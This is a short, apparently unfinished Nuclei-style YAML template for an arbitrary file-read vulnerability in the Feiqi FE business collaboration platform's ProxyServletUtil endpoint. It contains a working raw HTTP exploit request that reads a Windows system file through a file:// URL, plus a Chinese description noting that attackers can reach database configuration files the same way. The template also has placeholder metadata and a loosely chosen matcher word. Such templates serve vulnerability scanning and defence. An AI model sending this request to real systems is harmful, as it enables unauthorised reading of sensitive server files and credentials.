id: feiqi-fe-ProxyServletUtil-fileread
info:
  name: Template Name
  author: apple
  severity: high
  description: 飞企互联FE业务协作平台ProxyServletUi接口存在文件读取漏洞，攻击者可通过该漏洞读取系统重要文件、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |
        GET /ProxyServletUtil?url=file:///C:/Windows/System32/drivers/etc/hosts HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: word
        part: body
        words:
          - 'Copyright'
